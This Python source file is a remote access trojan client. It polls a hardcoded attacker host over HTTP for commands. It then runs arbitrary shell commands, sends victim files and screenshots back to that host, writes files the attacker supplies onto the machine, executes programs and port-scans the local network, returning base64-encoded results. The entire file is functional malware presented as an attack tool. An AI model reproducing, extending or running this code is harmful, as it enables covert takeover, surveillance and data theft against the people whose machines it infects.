from os.path import exists, dirname, realpath
from os import chdir, getcwd, environ, remove
from sys import argv
from subprocess import Popen, PIPE, call
from socket import socket, AF_INET, SOCK_STREAM
from PIL import ImageGrab
from base64 import b64encode, decodestring
import pycurl
from io import BytesIO
from re import sub as resub
from base64 import b64decode

ATTACKER_IP_URL = 'http://192.168.50.79'

dicURLEncode = {" ":"%20",
                "!":"%21",
                "\"":"%22",
                "#":"%23",
                "$":"%24",
                "%":"%25",
                "&":"%26",
                "'":"%27",
                "(":"%28",
                ")":"%29",
                "*":"%2A",
                "+":"%2B",
                ",":"%2C",
                "-":"%2D",
                ".":"%2E",
                "/":"%2F",
                ":":"%3A",
                ";":"%3B",
                "<":"%3C",
                "=":"%3D",
                ">":"%3E",
                "?":"%3F",
                "@":"%40",
                "[":"%5B",
                "\\":"%5C",
                "]":"%5D",
                "^":"%5E",
                "_":"%5F",
                "`":"%60",
                "{":"%7B",
                "|":"%7C",
                "}":"%7D",
                "~":"%7E",
                "¢":"%A2",
                "£":"%A3",
                "¥":"%A5",
                "|":"%A6",
                "§":"%A7",
                "«":"%AB",
                "¬":"%AC",
                "¯":"%AD",
                "º":"%B0",
                "±":"%B1",
                "ª":"%B2",
                ",":"%B4",
                "µ":"%B5",
                "»":"%BB",
                "¼":"%BC",
                "½":"%BD",
                "¿":"%BF",
                "À":"%C0",
                "Á":"%C1",
                "Â":"%C2",
                "Ã":"%C3",
                "Ä":"%C4",
                "Å":"%C5",
                "Æ":"%C6",
                "Ç":"%C7",
                "È":"%C8",
                "É":"%C9",
                "Ê":"%CA",
                "Ë":"%CB",
                "Ì":"%CC",
                "Í":"%CD",
                "Î":"%CE",
                "Ï":"%CF",
                "Ð":"%D0",
                "Ñ":"%D1",
                "Ò":"%D2",
                "Ó":"%D3",
                "Ô":"%D4",
                "Õ":"%D5",
                "Ö":"%D6",
                "Ø":"%D8",
                "Ù":"%D9",
                "Ú":"%DA",
                "Û":"%DB",
                "Ü":"%DC",
                "Ý":"%DD",
                "Þ":"%DE",
                "ß":"%DF",
                "à":"%E0",
                "á":"%E1",
                "â":"%E2",
                "ã":"%E3",
                "ä":"%E4",
                "å":"%E5",
                "æ":"%E6",
                "ç":"%E7",
                "è":"%E8",
                "é":"%E9",
                "ê":"%EA",
                "ë":"%EB",
                "ì":"%EC",
                "í":"%ED",
                "î":"%EE",
                "ï":"%EF",
                "ð":"%F0",
                "ñ":"%F1",
                "ò":"%F2",
                "ó":"%F3",
                "ô":"%F4",
                "õ":"%F5",
                "ö":"%F6",
                "÷":"%F7",
                "ø":"%F8",
                "ù":"%F9",
                "ú":"%FA",
                "û":"%FB",
                "ü":"%FC",
                "ý":"%FD",
                "þ":"%FE",
                "ÿ":"%FF"}

def quote_plus(whatToSearch, needToEncode=True):
    if needToEncode:
        whatToSearch = b64encode(whatToSearch.encode()).decode()

    newString = ''
    for item in whatToSearch:
        dicVal = None
        try:
            dicVal = dicURLEncode.get(item)
        except Exception:
            pass

        if dicVal is None:
            newString += item
        else:
            newString += dicVal
    return newString

def httpReq(url, data=None, typeReq='POST', returnBytes=False):
    buffer = BytesIO()
    c = pycurl.Curl()
    c.setopt(pycurl.FOLLOWLOCATION, 1)
    c.setopt(pycurl.WRITEFUNCTION, buffer.write)
    c.setopt(pycurl.URL,url)
    c.setopt(pycurl.TIMEOUT, 10)

    if typeReq == 'POST':
        c.setopt(pycurl.POST, 1)

    if data is not None:
        if type(data) != type(''):
            if type(data) == type(b''):
                newData = data
            else:
                newData = '='.join(data.items())
            data = newData
        c.setopt(pycurl.POSTFIELDS, data)

    c.perform()
    if returnBytes:
        return buffer.getvalue()
    else:
        return buffer.getvalue().decode(errors="ignore")

#Command to walk through client OS. Server side syntax:
#                     cd::{PATH}
def cd(command):
    code = ""
    directory = ""
    try:
        code,directory = command.split('::')
    except Exception as e:
        httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] Invalid command syntax.\n'))
        return
    
    if exists(str(directory.replace('"',''))):
        chdir(str(directory.replace('"','')))
        httpReq(ATTACKER_IP_URL + '/CDirectory', data="file=" + quote_plus(getcwd()))
        httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [INFO] Current working directory updated successfully.\n'))
    else:
        httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] The specified path is invalid or does not exist.\n'))

#Command to get (download) a client's file via HTTP request. Server side syntax:
#                     get::{FILE_TO_GET_PATH}
def GetFile(command):
    get = ""
    filePath = ""
    try:
        get,filePath=command.split('::')
    except Exception as e:
        httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] Invalid command syntax.\n'))
        return

    if exists(filePath.replace('"','')):
        fName = filePath.replace('"','')

        httpReq(ATTACKER_IP_URL + '/storeFileName', data="file=" + quote_plus(fName))
        httpReq(ATTACKER_IP_URL + '/store', data=open(fName, 'rb').read())
        httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [INFO] Download successful.\n'))
    else:
        httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] Unable to find the specified file.\n'))

#Command to upload a file on the server on the client working directory via HTTP request. Server side syntax:
#                     upload::{FILE_TO_UPLOAD_PATH}
def UploadFile(command):
    upload = ""
    fileContentPath = ""
    try:
        upload,fileContentPath=command.split('::')
    except Exception as e:
        httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] Invalid command syntax.\n'))
        return

    try:
        fileBytes = httpReq(ATTACKER_IP_URL + '/uploadRequest', data='file=' + quote_plus(fileContentPath.replace('"','')),returnBytes=True)
        fName = httpReq(ATTACKER_IP_URL + '/uploadRequestFileName', data='file=' + quote_plus(fileContentPath.replace('"',''))).encode()
        
        altchars=b'+/'
        fName = resub(rb'[^a-zA-Z0-9%s]+' % altchars, b'', fName)
        missing_padding = len(fName) % 4
        if missing_padding:
            fName += b'='* (4 - missing_padding)

        fName = b64decode(fName, altchars)
        fName = fName.decode()

        try:
            with open(fName,'wb') as f:
                f.write(fileBytes)
            httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [INFO] Upload successful.\n'))
        except Exception as e:
            httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] An error occured when trying to upload.\n'))
            pass

    except Exception as e:
        httpReq(ATTACKER_IP_URL, data="file=" + quote_plus(str(e.args)))

#Command to scan ports of a machine on the client network via HTTP request. Server side syntax:
#                     scan::{IP_TO_SCAN}::{PORT_1},{PORT_2},{PORT_N}
def ScanP(ip, ports):
    scan_result = '\n'
    
    for port in ports.split(','):
        sock = socket(AF_INET, SOCK_STREAM)
        try:
            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + "       [OPEN] " + port + '\n'
            else:
                scan_result = scan_result + "       [CLOSED] " + port + '\n'
            sock.close()
        except Exception as e:
            sock.close()
            httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] An error occured during the scan.\n'))
            pass
    
    httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [INFO] Scanned specified ports successfully.\n' + scan_result))


#Command to execute remote files via HTTP request. Server side syntax:
#                     exec::{FILE_TO_EXECUTE_PATH}::{FILE_TO_EXECUTE_ARGUMENTS}
def Execute(command):
    arr = command.split('::')

    if len(arr) == 2:
        if exists(arr[1].replace('"','')):
            call('"' + arr[1].replace('"','') + '"', shell=True)
            httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [INFO] Execution Successful.\n'))
        else:
            httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] Unable to find the specified file.\n'))
    elif len(arr) == 3:
        call('"' + arr[1].replace('"','') + '"', shell=True)

if __name__ == "__main__":
    ScreenshotCounter = 0
    httpReq(ATTACKER_IP_URL + '/CDirectory', data="file=" + quote_plus(dirname(realpath(argv[0]))))

    while True:
        command = httpReq(ATTACKER_IP_URL, typeReq='GET')

        if command.startswith('get::'):
            GetFile(command)
            
        elif command.startswith('cd::'):
            cd(command)
        
        elif command.startswith('upload::'):
            UploadFile(command)

        elif command.startswith('scan::'):
            scan,ip,ports = command.split('::')
            ScanP(ip, ports)

        elif command == 'screens':
            dirpath = ""
            if exists("C:\Windows"):
                dirpath = environ['TEMP']
            else:
                dirpath = environ['TMPDIR']
            dirpath = dirpath + "\Screenshot_" + str(ScreenshotCounter) + ".jpg"
            ImageGrab.grab().save(dirpath, "JPEG")
            ScreenshotCounter = ScreenshotCounter + 1
            fName = dirpath.replace('"','')
            httpReq(ATTACKER_IP_URL + '/storeFileName', data="file=" + quote_plus(fName))
            httpReq(ATTACKER_IP_URL + '/store', data=open(fName, 'rb').read())
            remove(dirpath)

        elif command.startswith('exec::'):
            Execute(command)

        elif command.startswith('quit'):
            break

        else:
            CMD = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            httpReq(ATTACKER_IP_URL, data="file=" + quote_plus(CMD.stdout.read().decode('cp1252')))
            httpReq(ATTACKER_IP_URL, data="file=" + quote_plus(CMD.stderr.read().decode('cp1252')))